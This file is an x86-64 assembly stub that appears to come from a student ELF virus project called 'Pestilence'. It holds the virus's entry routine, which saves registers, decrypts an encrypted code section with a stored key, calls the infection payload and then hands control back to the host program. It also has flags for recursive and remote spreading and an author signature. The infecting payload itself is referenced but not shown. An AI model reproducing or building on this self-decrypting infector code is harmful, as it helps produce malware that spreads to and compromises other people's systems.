section .textstart
global _infect

global key

global opt
global test_area

global iscompressed
global environ
global seed
global fingerprint

extern entry
extern decrypt
extern DECRYPT_ROUTINE
extern cmpr_start
extern cmpr_end

global environ

_infect:
	jmp begin
data:
diff: db `00000000`

opt:
do_recur: db `\0`
do_remote: db `\0`
do_dns_remote: db `\0`
print_msg: db `\0`

aligner: db `0000`
iscompressed: db `00000000`

key: db `0000000000000000`
test_area: db `AAAAAAAAAAAAAAA`,0

signature: db `Pestilence version 1.0 (c)oded by ndombre-agadhgad-`
fingerprint: db `AAAAAAAA`,0

environ: db `00000000`

begin:	
	;pop r15 ;size_t ac
	;mov r14, rsp ;char **av
	;push r15

	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rsp
core:
	;get entry_point of the program
	mov r14, QWORD[rel diff]
	lea rax, [rel _infect]
	sub rax, r14
	mov r14, rax

	lea rdi, [rel cmpr_start]
	lea rsi, [rel cmpr_end]
	sub rsi, rdi ;cmpr_end - cmpr_start
	lea rdx, [rel key]
	call DECRYPT_ROUTINE
	jmp start2

section .textcmpr
start2:
	
	;
	call entry

	pop rsp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	push r14
	mov r14, 0
	ret

data2:
	seed: db `10400709`
